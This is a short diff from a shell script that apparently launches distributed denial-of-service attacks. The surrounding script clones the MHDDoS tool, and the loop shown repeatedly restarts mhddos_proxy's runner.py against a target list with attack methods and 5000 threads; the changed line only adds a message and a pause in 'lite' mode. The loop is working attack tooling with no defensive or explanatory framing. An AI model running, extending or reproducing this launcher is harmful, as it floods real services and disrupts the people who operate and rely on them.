@@ -145,6 +145,7 @@ git clone https://github.com/MHProDev/MHDDoS.git
 while true; do
     pkill -f start.py; pkill -f runner.py
     if [[ $lite == "on" ]]; then
+        echo "lite mode"; sleep 5
         tail -n 2000 $targets_uniq > $targets_lite
         python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 5000 &
     else
